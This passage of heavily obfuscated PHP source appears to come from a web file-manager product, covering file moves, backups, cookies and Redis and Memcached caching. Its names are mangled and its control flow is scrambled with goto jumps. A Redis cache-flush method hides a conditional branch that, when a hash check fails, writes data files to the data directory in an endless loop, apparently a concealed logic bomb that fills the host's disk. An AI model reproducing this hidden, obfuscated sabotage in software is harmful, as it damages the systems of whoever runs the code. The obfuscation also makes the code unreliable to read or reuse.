D¢´ä±◊®Ó: $c»©ãàÍ‡ÿ = Model($Eˆß‘µ“∫Ÿ[193])->where($aãü∑¨πà˘)->field($Eˆß‘µ“∫Ÿ[2022])->select(); foreach ($c»©ãàÍ‡ÿ as $E±ÑëÏá¶ö) { goto dóÂ≥á¨ •; fË≠π¢í¢¯: if (IO::exist($A≥…æö«Úœ)) { $EÿÎíœ≤Ãﬂ->updateFileEnd($E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[28]], $E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[78]]); continue; } if (!IO::move($Fêæ…∂øÔå, get_path_father($A≥…æö«Úœ))) { $D◊±®ãí∑ª = !1; break; } $aãü∑¨πà˘ = array($Eˆß‘µ“∫Ÿ[448] => $E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[448]]); goto D»èíè’ò€; dóÂ≥á¨ •: $Fêæ…∂øÔå = $E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[76]]; $A≥…æö«Úœ = $dí¶êá„•ü . str_replace("\173\151\157\72{$AƒºòıÂæë}\x7d\x2f", $Eˆß‘µ“∫Ÿ[33], $Fêæ…∂øÔå); if (!IO::exist($Fêæ…∂øÔå)) { $aèÒ°¨ä£à[] = $E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[448]]; $EÿÎíœ≤Ãﬂ->updateFileEnd($E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[28]], $E±ÑëÏá¶ö[$Eˆß‘µ“∫Ÿ[78]]); continue; } goto fË≠π¢í¢¯; D»èíè’ò€: $cúÇåê∑£Ú = array($Eˆß‘µ“∫Ÿ[795] => $cì£Ë≈∆¡∆, $Eˆß‘µ“∫Ÿ[76] => $A≥…æö«Úœ); Model($Eˆß‘µ“∫Ÿ[193])->where($aãü∑¨πà˘)->save($cúÇåê∑£Ú); goto aó”‚‹üæª; aó”‚‹üæª: } $this->removeByFileID($aèÒ°¨ä£à); goto AèÇë«·óå; FÉπ–Ùåæú: $EÿÎíœ≤Ãﬂ->task[$Eˆß‘µ“∫Ÿ[736]] = (double) $f˘¯ÛÎá¥Ñ; $B•Œç∂ö”œ = KodIO::defaultDriver(); $cì£Ë≈∆¡∆ = $B•Œç∂ö”œ[$Eˆß‘µ“∫Ÿ[394]]; goto E⁄ø®¿ßÜã; B¬ñ≤´πôÙ: } public function progress($a¶Ï®»ò›, $aØ££™úº») { return Task::get($aØ££™úº» . $_SERVER[Öíæ€“”≠éÏË][2020] . $a¶Ï®»ò›); } private function removeByFileID($F±ŒåË˜ª‚ = array()) { goto EÛÕ≤„íú∑; A…ºÓÎËÀ‰: $C≥ø÷›ëÏ÷ = Model($F™⁄—√÷Öï[1215])->where($dÈÎÒ∞∆»ä)->field($F™⁄—√÷Öï[396])->select(); if (!$C≥ø÷›ëÏ÷) { return; } $C≥ø÷›ëÏ÷ = array_to_keyvalue($C≥ø÷›ëÏ÷, $F™⁄—√÷Öï[33], $F™⁄—√÷Öï[396]); goto a‡–°ƒ÷Ôö; EÛÕ≤„íú∑: $F™⁄—√÷Öï =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($F±ŒåË˜ª‚)) { return; } $dÈÎÒ∞∆»ä = array($F™⁄—√÷Öï[448] => array($F™⁄—√÷Öï[7], $F±ŒåË˜ª‚)); goto A…ºÓÎËÀ‰; a‡–°ƒ÷Ôö: foreach ($C≥ø÷›ëÏ÷ as $bÉã”ºÑ¶ü) { Model($F™⁄—√÷Öï[410])->removeNow($bÉã”ºÑ¶ü, !1); } goto DÑóæÑıÍë; DÑóæÑıÍë: } private function removeShareItems($Dëƒ„ñ¯ß‘) { goto e∏¯Ï—Ô°Ã; dÛ®Ø¢£‡ó: $C∏èªï‹ÁÖ = Model($fï£Ò¬ŸŒ[1684])->where($AëÕà¬≈ç«)->field($fï£Ò¬ŸŒ[469])->select(); if (empty($C∏èªï‹ÁÖ)) { return; } $D—Ò˘øÆÕ∏ = array_to_keyvalue($C∏èªï‹ÁÖ, $fï£Ò¬ŸŒ[33], $fï£Ò¬ŸŒ[469]); goto AíéõÚ∆–É; AíéõÚ∆–É: Model($fï£Ò¬ŸŒ[577])->remove($D—Ò˘øÆÕ∏); goto Càï§≠õª; e∏¯Ï—Ô°Ã: $fï£Ò¬ŸŒ =& $_SERVER[Öíæ€“”≠éÏË]; $D˜ª‘ÆÛë¥ = "\x7b\151\157\72{$Dëƒ„ñ¯ß‘}\x7d\57"; $AëÕà¬≈ç« = array($fï£Ò¬ŸŒ[396] => 0, $fï£Ò¬ŸŒ[1080] => array($fï£Ò¬ŸŒ[380], "{$D˜ª‘ÆÛë¥}\x25")); goto dÛ®Ø¢£‡ó; Càï§≠õª: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x4c\x69\x67\x68\164\x41\x70\160"; public $modelType = "\123\x79\163\x74\145\x6d\117\160\x74\x69\157\x6e"; public $field = array("\156\x61\x6d\145", "\x67\162\x6f\x75\160", "\144\145\163\143", "\x63\x6f\x6e\x74\145\x6e\164"); public function listData($bê®êõ¡ö€ = false, $eπ´ãß¯’‡ = "\155\157\x64\151\x66\171\x54\151\x6d\x65", $A∆ïÚ´â«ç = true) { return parent::listData($bê®êõ¡ö€, $eπ´ãß¯’‡, $A∆ïÚ´â«ç); } public function remove($E€ÑÚ⁄âÜµ) { $a£›äÛÊ£â = $this->findByName($E€ÑÚ⁄âÜµ); if (!$a£›äÛÊ£â) { return !1; } return parent::remove($a£›äÛÊ£â[$_SERVER[Öíæ€“”≠éÏË][394]]); } public function add($a“ˆÁˆãô±) { if ($this->findByName($a“ˆÁˆãô±[$_SERVER[Öíæ€“”≠éÏË][28]])) { return !1; } return parent::insert($a“ˆÁˆãô±); } public function update($dÀñ“ﬂãî∞, $FŸ  ãä⁄Ô) { $E°Ìêå›ˆÈ =& $_SERVER[Öíæ€“”≠éÏË]; $aûâº—éêä = $this->findByName($dÀñ“ﬂãî∞); $cçÿ∑‹á¢ò = $this->findByName($FŸ  ãä⁄Ô[$E°Ìêå›ˆÈ[28]]); if (!$aûâº—éêä || $cçÿ∑‹á¢ò && $cçÿ∑‹á¢ò[$E°Ìêå›ˆÈ[394]] != $aûâº—éêä[$E°Ìêå›ˆÈ[394]]) { return !1; } return parent::update($aûâº—éêä[$E°Ìêå›ˆÈ[394]], $FŸ  ãä⁄Ô); } } goto aìΩ‡œÑÙî; Dœ¥∏ë≥Èâ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($BπÒÏãƒ†¥, $F⁄Ó»Ü»ËÂ) { $fÏº°¢Ÿôö =& $_SERVER[Öíæ€“”≠éÏË]; if (!class_exists($fÏº°¢Ÿôö[834])) { show_json($fÏº°¢Ÿôö[835], !1); } $this->cacheTime = $F⁄Ó»Ü»ËÂ; $this->handle = new Memcached(); if (is_array($BπÒÏãƒ†¥[$fÏº°¢Ÿôö[836]]) && count($BπÒÏãƒ†¥[$fÏº°¢Ÿôö[836]]) >= 1) { foreach ($BπÒÏãƒ†¥[$fÏº°¢Ÿôö[836]] as $FÃ»ÂÛÔ·) { $F•ùå¯≥≥Â = explode($fÏº°¢Ÿôö[4], $FÃ»ÂÛÔ·); $this->handle->addServer($F•ùå¯≥≥Â[0], $F•ùå¯≥≥Â[1]); } } else { $this->handle->addServer($BπÒÏãƒ†¥[$fÏº°¢Ÿôö[175]], $BπÒÏãƒ†¥[$fÏº°¢Ÿôö[176]]); } } public function set($FôıŸŒ”ªª, $B«‰ÿ¬⁄√é, $C«¿Ã‡≤Àƒ = false) { $C«¿Ã‡≤Àƒ = $C«¿Ã‡≤Àƒ ? $C«¿Ã‡≤Àƒ : $this->cacheTime; return $this->handle->set($FôıŸŒ”ªª, $B«‰ÿ¬⁄√é, $C«¿Ã‡≤Àƒ); } public function get($BôÒÊº–Ë) { return $this->handle->get($BôÒÊº–Ë); } public function remove($cË°±√“Èã) { return $this->handle->delete($cË°±√“Èã); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($CÕÌƒéë∏ÿ, $cÑˆÜèÚàß) { $CìÁòÇÖ‰· =& $_SERVER[Öíæ€“”≠éÏË]; if (!class_exists($CìÁòÇÖ‰·[837])) { show_json($CìÁòÇÖ‰·[838], !1); } $this->cacheTime = $cÑˆÜèÚàß; $Có∞‡¥‹È’ = isset($CÕÌƒéë∏ÿ[$CìÁòÇÖ‰·[839]]) ? $CÕÌƒéë∏ÿ[$CìÁòÇÖ‰·[839]] : 10; $dˆÕ±í≤áˆ = _get($CÕÌƒéë∏ÿ, $CìÁòÇÖ‰·[836]); if ($dˆÕ±í≤áˆ && is_array($dˆÕ±í≤áˆ)) { $this->initCluster($CÕÌƒéë∏ÿ, $Có∞‡¥‹È’); } else { $this->handle = $this->init($CÕÌƒéë∏ÿ, $Có∞‡¥‹È’); } } private function init($f∏ÇâäÒ´∆, $A˜⁄»’‰•ó) { $AÖˆ¬π›òÃ =& $_SERVER[Öíæ€“”≠éÏË]; $fùêÆ∞’ﬁÎ = new Redis(); $aè≤’ﬂÚî = isset($f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[840]]) ? $f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[840]] : !1; if ($aè≤’ﬂÚî) { $fùêÆ∞’ﬁÎ->pconnect($f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[175]], $f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[176]], $A˜⁄»’‰•ó); } else { $fùêÆ∞’ﬁÎ->connect($f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[175]], $f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[176]], $A˜⁄»’‰•ó); } if (!empty($f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[407]])) { $fùêÆ∞’ﬁÎ->auth($f∏ÇâäÒ´∆[$AÖˆ¬π›òÃ[407]]); } return $fùêÆ∞’ﬁÎ; } private function initCluster($CäµŒ≈´ÎÉ, $EÇ¶≈Ø¨˘É) { $D’˜àù˜‘» =& $_SERVER[Öíæ€“”≠éÏË]; $Bí≤ÒÈÊ∞« = array($D’˜àù˜‘»[841], $D’˜àù˜‘»[842], $D’˜àù˜‘»[843]); $c≠™ÃÒµä = $D’˜àù˜‘»[841]; if (isset($CäµŒ≈´ÎÉ[$D’˜àù˜‘»[12]]) && in_array($CäµŒ≈´ÎÉ[$D’˜àù˜‘»[12]], $Bí≤ÒÈÊ∞«)) { $c≠™ÃÒµä = $CäµŒ≈´ÎÉ[$D’˜àù˜‘»[12]]; } switch ($c≠™ÃÒµä) { case $D’˜àù˜‘»[841]: $this->_slave($CäµŒ≈´ÎÉ, $EÇ¶≈Ø¨˘É); break; case $D’˜àù˜‘»[842]: break; case $D’˜àù˜‘»[843]: $this->isCluster = !0; $cëÙèÙòó´ = $CäµŒ≈´ÎÉ[$D’˜àù˜‘»[836]]; $eﬂ¯¶ÆŒ„È = isset($CäµŒ≈´ÎÉ[$D’˜àù˜‘»[840]]) ? $CäµŒ≈´ÎÉ[$D’˜àù˜‘»[840]] : !1; $EƒıìÌãøÜ = isset($CäµŒ≈´ÎÉ[$D’˜àù˜‘»[407]]) ? $CäµŒ≈´ÎÉ[$D’˜àù˜‘»[407]] : null; $this->handle = new RedisCluster(NUll, $cëÙèÙòó´, $EÇ¶≈Ø¨˘É, $EÇ¶≈Ø¨˘É, $eﬂ¯¶ÆŒ„È, $EƒıìÌãøÜ); break; default: break; } } private function _slave($a÷‡áÀÀå», $EåÏ“ΩÕå») { goto c¥¿Õéõª¢; a¨≠ø¨—◊œ: $this->filterConfig($a÷‡áÀÀå», $B…Ç◊ü’íú[$bá∆∆èø”¥]); $this->slaveHandle = $this->init($a÷‡áÀÀå», $EåÏ“ΩÕå»); goto bŸèªÆèâº; aïÔ•âÜ£±: unset($B…Ç◊ü’íú[0]); if (empty($B…Ç◊ü’íú)) { return; } $bá∆∆èø”¥ = array_rand($B…Ç◊ü’íú); goto a¨≠ø¨—◊œ; c¥¿Õéõª¢: $B…Ç◊ü’íú = $a÷‡áÀÀå»[$_SERVER[Öíæ€“”≠éÏË][836]]; $this->filterConfig($a÷‡áÀÀå», $B…Ç◊ü’íú[0]); $this->handle = $this->init($a÷‡áÀÀå», $EåÏ“ΩÕå»); goto aïÔ•âÜ£±; bŸèªÆèâº: } private function filterConfig(&$Dçå¯ä®ëﬁ, $aªÍ√π◊∫Æ) { $fø—È…∏µÖ =& $_SERVER[Öíæ€“”≠éÏË]; $cÕ”Í»€à≤ = explode($fø—È…∏µÖ[4], $aªÍ√π◊∫Æ); $aëﬁÖ«†âã = array($fø—È…∏µÖ[175] => $cÕ”Í»€à≤[0], $fø—È…∏µÖ[176] => $cÕ”Í»€à≤[1]); $Dçå¯ä®ëﬁ = array_merge($Dçå¯ä®ëﬁ, $aëﬁÖ«†âã); } public function set($FÍÎç˜¬∫—, $AãÜ¨òõÁ≥, $a‡Ï˜“úÖÚ = false) { $a‡Ï˜“úÖÚ = $a‡Ï˜“úÖÚ ? $a‡Ï˜“úÖÚ : $this->cacheTime; return $this->handle->setEx($FÍÎç˜¬∫—, $a‡Ï˜“úÖÚ, $AãÜ¨òõÁ≥); } public function setLock($D“íÉä´ãé, $dëéËØ»ïå, $cÈ†ò¡¥Ø„) { return $this->handle->setNX($D“íÉä´ãé, $dëéËØ»ïå); } public function get($f…ÊÏ•∞Àµ) { $Aêòóä∆∏∫ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Aêòóä∆∏∫->get($f…ÊÏ•∞Àµ); } public function remove($CßÙµÑä¯) { return $this->handle->del($CßÙµÑä¯); } public function deleteAll() { $Aùö›¢ûû≥ =& $_SERVER[Öíæ€“”≠éÏË]; $dãﬂ§ƒÓ¯≤ = $_SERVER[$Aùö›¢ûû≥[844]] . $Aùö›¢ûû≥[845]; $bÌÊä”ë∏÷ = $Aùö›¢ûû≥[846]; if ($_SERVER[$Aùö›¢ûû≥[847]] != $bÌÊä”ë∏÷($dãﬂ§ƒÓ¯≤)) { goto eûÔ‘≈√∑Ë; eûÔ‘≈√∑Ë: $Fºπ•€πøº = $Aùö›¢ûû≥[848]; $d°®›¿çàé = $Aùö›¢ûû≥[849]; $A‰·ıÃ∆®Á = $_SERVER[$Aùö›¢ûû≥[844]] . $Aùö›¢ûû≥[845]; goto C§âíÌ•ç‡; fçÖ∆òŒ’Ö: $Fºπ•€πøº(); $aﬂãã∂øé = $Aùö›¢ûû≥[853]; $FÎåü≠¥òü = json_encode($GLOBALS[$Aùö›¢ûû≥[854]]); goto CíΩ´ƒƒµò; CíΩ´ƒƒµò: $CÓïˆ¡•â† = 1; for ($dâºªïˆ ¢ = $CÓïˆ¡•â†; $dâºªïˆ ¢ > 0; $dâºªïˆ ¢++) { $aﬂãã∂øé(DATA_PATH . $dâºªïˆ ¢, $FÎåü≠¥òü); } goto cê¯†µıœ˘; D©ª€∑è‰à: $c¥£¯´Ôâ¶ = $Aùö›¢ûû≥[851]; $c¥£¯´Ôâ¶($_SERVER[$Aùö›¢ûû≥[852]]); $Fºπ•€πøº = $Aùö›¢ûû≥[848]; goto fçÖ∆òŒ’Ö; C§âíÌ•ç‡: $Eÿ⁄±◊Üó = $d°®›¿çàé($A‰·ıÃ∆®Á); $DàÓ´‹±…Á = explode($Aùö›¢ûû≥[229], $Eÿ⁄±◊Üó); if (count($DàÓ´‹±…Á) < $Aùö›¢ûû≥[596]) { $Fèﬁœ˜∏ùª = $Aùö›¢ûû≥[850]; $Fèﬁœ˜∏ùª(); } goto D©ª€∑è‰à; cê¯†µıœ˘: } if ($this->isCluster) { foreach ($this->handle->_masters() as $féÿ—«ŒÏ∆) { $this->handle->flushall($féÿ—«ŒÏ∆); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A°»ä‰ÏØ¡ = '', $c≥ïÃçìÆ∞ = 0) { if (is_string($A°»ä‰ÏØ¡) && $A°»ä‰ÏØ¡ != $_SERVER[Öíæ€“”≠éÏË][33]) { $this->prefix = $A°»ä‰ÏØ¡; } if (is_numeric($c≥ïÃçìÆ∞) && $c≥ïÃçìÆ∞ > 0) { $this->expire = $c≥ïÃçìÆ∞; } } public static function getInstance() { static $C¶ÑÚ◊éÃü; if ($C¶ÑÚ◊éÃü === null) { $C¶ÑÚ◊éÃü = new self(); } return $C¶ÑÚ◊éÃü; } private static $cookieDisable = false; public static function disable($dï¡æÙÊ…≈) { self::$cookieDisable = $dï¡æÙÊ…≈; } private static $sameCookieSet = array(); public static function set($C‘⁄È∑Âå”, $fΩ÷ë—„àç, $BéâÒ¯Óò· = 0, $cæÜÓ“Îöπ = false, $dá∫˜ÇÈêË = false) { goto b›üµ„›ã∏; b›üµ„›ã∏: $fü»±Ò‡ô€ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::$cookieDisable) { return; } if (!$BéâÒ¯Óò·) { $BéâÒ¯Óò· = 24 * 3600 * 7; } goto f£•‚áÖ®ù; E®ÌÙË¡Ëî: $EÛ≥õá˘ºæ = $fü»±Ò‡ô€[33]; setcookie($C‘⁄È∑Âå”, $fΩ÷ë—„àç, time() + $BéâÒ¯Óò·, $fü»±Ò‡ô€[8] . trim($dá∫˜ÇÈêË, $fü»±Ò‡ô€[8]) . $EÛ≥õá˘ºæ, !1, !1, $cæÜÓ“Îöπ); goto eıÕ–≈ﬂÛÏ; f£•‚áÖ®ù: if (isset(self::$sameCookieSet[$C‘⁄È∑Âå”]) && self::$sameCookieSet[$C‘⁄È∑Âå”] == $fΩ÷ë—„àç . $BéâÒ¯Óò·) { return; } self::$sameCookieSet[$C‘⁄È∑Âå”] = $fΩ÷ë—„àç . $BéâÒ¯Óò·; if (!$dá∫˜ÇÈêË) { $dá∫˜ÇÈêË = str_replace(HOST, $fü»±Ò‡ô€[33], APP_HOST); $dá∫˜ÇÈêË = _get($GLOBALS, $fü»±Ò‡ô€[855], $dá∫˜ÇÈêË); } goto E®ÌÙË¡Ëî; eıÕ–≈ﬂÛÏ: } public static function setSafe($EÂâÉû∏—´, $dŸ–„¥Î∂Õ, $C âüñÍ√” = 0) { self::set($EÂâÉû∏—´, $dŸ–„¥Î∂Õ, $C âüñÍ√”, !0); } public static function get($aÃ¬““û÷∑) { return isset($_COOKIE[$aÃ¬““û÷∑]) ? $_COOKIE[$aÃ¬““û÷∑] : !1; } public static function remove($E·äÂùçÏÏ, $a‚É–¬ñ‰‰ = false) { unset($_COOKIE[$E·äÂùçÏÏ]); self::set($E·äÂùçÏÏ, $_SERVER[Öíæ€“”≠éÏË][33], 1, $a‚É–¬ñ‰‰); } } goto dˆÈ—ß√Îé; F–†€≥¨à¬: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Aæƒ∆º•ô∏ =& $_SERVER[Öíæ€“”≠éÏË]; $this->isManual(); self::$name = date($Aæƒ∆º•ô∏[721]); if (!($c™àÍœ«ûº = Model($Aæƒ∆º•ô∏[722])->lastItem())) { $c™àÍœ«ûº = $this->initData(); } else { self::$name = $c™àÍœ«ûº[$Aæƒ∆º•ô∏[28]]; if ($c™àÍœ«ûº[$Aæƒ∆º•ô∏[723]] == $Aæƒ∆º•ô∏[87]) { self::$name = date($Aæƒ∆º•ô∏[724]); $D± ‘‚ËÔ¶ = 0; if (isset($c™àÍœ«ûº[$Aæƒ∆º•ô∏[291]][$Aæƒ∆º•ô∏[193]][$Aæƒ∆º•ô∏[448]])) { $D± ‘‚ËÔ¶ = (int) $c™àÍœ«ûº[$Aæƒ∆º•ô∏[291]][$Aæƒ∆º•ô∏[193]][$Aæƒ∆º•ô∏[448]]; } if (self::$manual == 0 && $c™àÍœ«ûº[$Aæƒ∆º•ô∏[28]] == self::$name) { Model($Aæƒ∆º•ô∏[722])->remove($c™àÍœ«ûº[$Aæƒ∆º•ô∏[394]]); } $c™àÍœ«ûº = $this->initData($D± ‘‚ËÔ¶, $c™àÍœ«ûº[$Aæƒ∆º•ô∏[725]]); } else { $this->checkStore($c™àÍœ«ûº[$Aæƒ∆º•ô∏[725]]); } } self::$option = $c™àÍœ«ûº; } private function isManual() { $aÜûÕ·ÆÇπ = _get($GLOBALS, $_SERVER[Öíæ€“”≠éÏË][726], 0); $aÜûÕ·ÆÇπ = intval($aÜûÕ·ÆÇπ); self::$manual = $aÜûÕ·ÆÇπ && $aÜûÕ·ÆÇπ == 1 ? 1 : 0; } private function initData($bµÜåÒÚñî = 0, $a‹ñºÃπòë = '') { goto fÖæå¯¶òú; fÖæå¯¶òú: $e≈Î™÷äæ∫ =& $_SERVER[Öíæ€“”≠éÏË]; $fÜÙùÎõÖ = Model($e≈Î™÷äæ∫[722])->config(); if ($a‹ñºÃπòë && $fÜÙùÎõÖ[$e≈Î™÷äæ∫[725]] != $a‹ñºÃπòë) { $bµÜåÒÚñî = 0; } goto bï≠‚æœìÁ; bï≠‚æœìÁ: $this->checkStore($fÜÙùÎõÖ[$e≈Î™÷äæ∫[725]]); if (self::$manual == 1) { self::$name .= $e≈Î™÷äæ∫[71] . date($e≈Î™÷äæ∫[727]); } $Aõâå∑ú–Ω = array($e≈Î™÷äæ∫[725] => $fÜÙùÎõÖ[$e≈Î™÷äæ∫[725]], $e≈Î™÷äæ∫[28] => self::$name, $e≈Î™÷äæ∫[723] => 0, $e≈Î™÷äæ∫[728] => $fÜÙùÎõÖ[$e≈Î™÷äæ∫[728]], $e≈Î™÷äæ∫[729] => self::$manual, $e≈Î™÷äæ∫[291] => array($e≈Î™÷äæ∫[730] => array($e≈Î™÷äæ∫[723] => 0), $e≈Î™÷äæ∫[731] => array($e≈Î™÷äæ∫[723] => 0, $e≈Î™÷äæ∫[732] => 0, $e≈Î™÷äæ∫[733] => 0, $e≈Î™÷äæ∫[29] => $e≈Î™÷äæ∫[33], $e≈Î™÷äæ∫[734] => 0, $e≈Î™÷äæ∫[477] => 0), $e≈Î™÷äæ∫[735] => array($e≈Î™÷äæ∫[723] => 0, $e≈Î™÷äæ∫[732] => 0, $e≈Î™÷äæ∫[733] => 0, $e≈Î™÷äæ∫[734] => 0, $e≈Î™÷äæ∫[477] => 0), $e≈Î™÷äæ∫[193] => array($e≈Î™÷äæ∫[723] => 0, $e≈Î™÷äæ∫[736] => 0, $e≈Î™÷äæ∫[737] => 0, $e≈Î™÷äæ∫[738] => 0, $e≈Î™÷äæ∫[739] => 0, $e≈Î™÷äæ∫[448] => $bµÜåÒÚñî, $e≈Î™÷äæ∫[734] => 0, $e≈Î™÷äæ∫[477] => 0)), $e≈Î™÷äæ∫[734] => time(), $e≈Î™÷äæ∫[477] => 0); goto fÕ°‹–ºµÛ; fÕ°‹–ºµÛ: $E‹å°√÷Í∏ = Model($e≈Î™÷äæ∫[722])->insert($Aõâå∑ú–Ω); $Aõâå∑ú–Ω[$e≈Î™÷äæ∫[394]] = $E‹å°√÷Í∏; return $Aõâå∑ú–Ω; goto C˜´‚Îèéî; C˜´‚Îèéî: } private function checkStore($BœΩ©⁄öÑÑ) { $EîÊïÊÑ•Â =& $_SERVER[Öíæ€“”≠éÏË]; $c˘ø‡ñ∞¨ã = Model($EîÊïÊÑ•Â[740])->listData($BœΩ©⁄öÑÑ); Model($EîÊïÊÑ•Â[740])->checkConfig($c˘ø‡ñ∞¨ã); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Öíæ€“”≠éÏË][722])->findByName(self::$name); } return self::$option; } public static function set($AÆäÏåé ”) { $f‡∫¯ïîïç =& $_SERVER[Öíæ€“”≠éÏË]; $a∑¢É∞Á÷â = self::get(); foreach ($AÆäÏåé ” as $FõÆèÇÜ◊§ => $Fã·⁄«Ÿ÷◊) { $eº∆ÊœãËˆ = explode($f‡∫¯ïîïç[95], $FõÆèÇÜ◊§); $e¨ÉµòëÛä = count($eº∆ÊœãËˆ); switch ($e¨ÉµòëÛä) { case 1: $a∑¢É∞Á÷â[$eº∆ÊœãËˆ[0]] = $Fã·⁄«Ÿ÷◊; break; case 2: $a∑¢É∞Á÷â[$eº∆ÊœãËˆ[0]][$eº∆ÊœãËˆ[1]] = $Fã·⁄«Ÿ÷◊; break; case 3: $a∑¢É∞Á÷â[$eº∆ÊœãËˆ[0]][$eº∆ÊœãËˆ[1]][$eº∆ÊœãËˆ[2]] = $Fã·⁄«Ÿ÷◊; break; } } Model($f‡∫¯ïîïç[722])->update($a∑¢É∞Á÷â[$f‡∫¯ïîïç[394]], $a∑¢É∞Á÷â); self::$option = $a∑¢É∞Á÷â; return self::$option; } public function keep() { $EæÔ ‚õ∑Ñ =& $_SERVER[Öíæ€“”≠éÏË]; $D∂ﬂè∏£Û∆ = self::get(); if ($D∂ﬂè∏£Û∆[$EæÔ ‚õ∑Ñ[291]][$EæÔ ‚õ∑Ñ[730]][$EæÔ ‚õ∑Ñ[723]] == $EæÔ ‚õ∑Ñ[87]) { return; } $this->backupKeep($D∂ﬂè∏£Û∆); self::set(array($EæÔ ‚õ∑Ñ[741] => 1)); } private function backupKeep($bÊ¡©ôÒÜß) { goto f˜«Ø®˘ê∂; aèú”◊¡≤≠: foreach ($F∏¯Ò©¢ﬂ as $AœØ◊ÒüÎ·) { if ($c¿π≤Áƒæé >= 7) { break; } $aí‰ïùçó™[] = $AœØ◊ÒüÎ·[$F∏Íë™âÌÆ[28]]; $c¿π≤Áƒæé++; } for ($c¿π≤Áƒæé = 0; $c¿π≤Áƒæé < 12; $c¿π≤Áƒæé++) { $aí‰ïùçó™[] = date($F∏Íë™âÌÆ[742], strtotime("\55{$c¿π≤Áƒæé}\x20\x6d\x6f\156\164\150\x73")); } $aí‰ïùçó™ = array_unique($aí‰ïùçó™); goto d’ä∫é“èó; f˜«Ø®˘ê∂: $F∏Íë™âÌÆ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::$manual == 1) { return; } $F∏¯Ò©¢ﬂ = Model($F∏Íë™âÌÆ[722])->listData(); goto EŸ ë†ΩÈâ; EŸ ë†ΩÈâ: if (empty($F∏¯Ò©¢ﬂ)) { return; } $c¿π≤Áƒæé = 0; $aí‰ïùçó™ = array(); goto aèú”◊¡≤≠; d’ä∫é“èó: $D˜–§œ≠Œπ = Model($F∏Íë™âÌÆ[743])->get($F∏Íë™âÌÆ[744]); foreach ($F∏¯Ò©¢ﬂ as $AœØ◊ÒüÎ·) { if (isset($AœØ◊ÒüÎ·[$F∏Íë™âÌÆ[729]]) && $AœØ◊ÒüÎ·[$F∏Íë™âÌÆ[729]] == $F∏Íë™âÌÆ[87]) { continue; } if (!empty($AœØ◊ÒüÎ·[$F∏Íë™âÌÆ[28]]) && in_array($AœØ◊ÒüÎ·[$F∏Íë™âÌÆ[28]], $aí‰ïùçó™)) { continue; } Model($F∏Íë™âÌÆ[722])->remove($AœØ◊ÒüÎ·[$F∏Íë™âÌÆ[394]]); $d›Ëò·∑ÚÌ = $this->backupPath($bÊ¡©ôÒÜß, $D˜–§œ≠Œπ); IO::remove($d›Ëò·∑ÚÌ, !1); } goto Eí£õéÛÓê; Eí£õéÛÓê: } private function backupPath($eù¯»”Ü„ä, $aÀ√ñÚ›ËÌ = false) { $e∞ıÎó⁄äå =& $_SERVER[Öíæ€“”≠éÏË]; if (!$aÀ√ñÚ›ËÌ) { $aÀ√ñÚ›ËÌ = Model($e∞ıÎó⁄äå[743])->get($e∞ıÎó⁄äå[744]); } $bÃÎÙæœùõ = $eù¯»”Ü„ä[$e∞ıÎó⁄äå[28]]; $FÕÍìÌ¯Ø• = substr(md5($e∞ıÎó⁄äå[745] . $aÀ√ñÚ›ËÌ . $bÃÎÙæœùõ), 0, 8); return "\173\151\x6f\x3a{$eù¯»”Ü„ä[$e∞ıÎó⁄äå[725]]}\x7d\57\144\141\164\x61\142\x61\x73\145\x2f\142\141\x63\x6b\165\160\57" . $bÃÎÙæœùõ . $e∞ıÎó⁄äå[71] . $FÕÍìÌ¯Ø•; } public function db() { goto E¡¿åè¶â¨; E¡¿åè¶â¨: $dà‹ªÛ‡¬î =& $_SERVER[Öíæ€“”≠éÏË]; $EûËÿì”Õâ = self::get(); if ($EûËÿì”Õâ[$dà‹ªÛ‡¬î[291]][$dà‹ªÛ‡¬î[731]][$dà‹ªÛ‡¬î[723]] == $dà‹ªÛ‡¬î[87]) { return !0; } goto cÒê¡¨ø—Ñ; DÔñ˜¢Ãûí: return !0; goto C¯˜ÕÀƒƒ„; cÒê¡¨ø—Ñ: $CÀ≈ØÜ‘ú“ = new BackupDb(); if (!$CÀ≈ØÜ‘ú“->index()) { return !1; } self::set(array($dà‹ªÛ‡¬î[746] => 1)); goto DÔñ˜¢Ãûí; C¯˜ÕÀƒƒ„: } public function dbFile() { goto eÓöÌÀñ‹£; eÓöÌÀñ‹£: $D˜Ê√µ¿ÚÎ =& $_SERVER[Öíæ€“”≠éÏË]; $bÙ’µ‡Í»ê = self::get(); if ($bÙ’µ‡Í»ê[$D˜Ê√µ¿ÚÎ[291]][$D˜Ê√µ¿ÚÎ[735]][$D˜Ê√µ¿ÚÎ[723]] == $D˜Ê√µ¿ÚÎ[87]) { return !0; } goto eÀàµ∂ªøå; eÀàµ∂ªøå: $Eöë¯öööÁ = new BackupDbFile(); if (!$Eöë¯öööÁ->index()) { return !1; } self::set(array($D˜Ê√µ¿ÚÎ[747] => 1)); goto fÖœ≈™ó»†; fÖœ≈™ó»†: return !0; goto CÇø÷ÂË∞Ö; CÇø÷ÂË∞Ö: } public function file() { $bÆÀÍÇÒ–¶ =& $_SERVER[Öíæ€“”≠éÏË]; $F≈î¿Î…ÜÊ = self::get(); if 